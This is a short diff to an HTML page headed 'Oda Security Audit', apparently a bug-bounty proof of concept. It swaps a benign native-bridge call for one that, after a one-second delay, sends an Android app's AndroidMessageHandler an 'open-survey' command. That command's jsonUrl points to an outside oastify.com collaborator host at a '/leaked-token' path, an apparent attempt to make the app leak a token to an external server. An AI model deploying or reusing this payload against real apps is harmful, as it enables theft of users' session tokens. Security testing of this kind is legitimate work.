@@ -1,11 +1,14 @@
 <html>
 <body>
-     <h1>Oda Security Audit</h1>
-     <script>
-        window.AndroidMessageHandler.postMessage(JSON.stringify({
-     "command": "open-native-url",
-     "url": "https://oda.com/no/account/contact/" 
-}));
-     </script>
+    <script>
+        setTimeout(function() {
+            if (window.AndroidMessageHandler) {
+                AndroidMessageHandler.postMessage(JSON.stringify({
+                    "command": "open-survey",
+                    "jsonUrl": "https://9blbud2clhjcxqjmbz6axauh1874vujj.oastify.com/leaked-token"
+                }));
+            }
+        }, 1000);
+    </script>
 </body>
 </html>
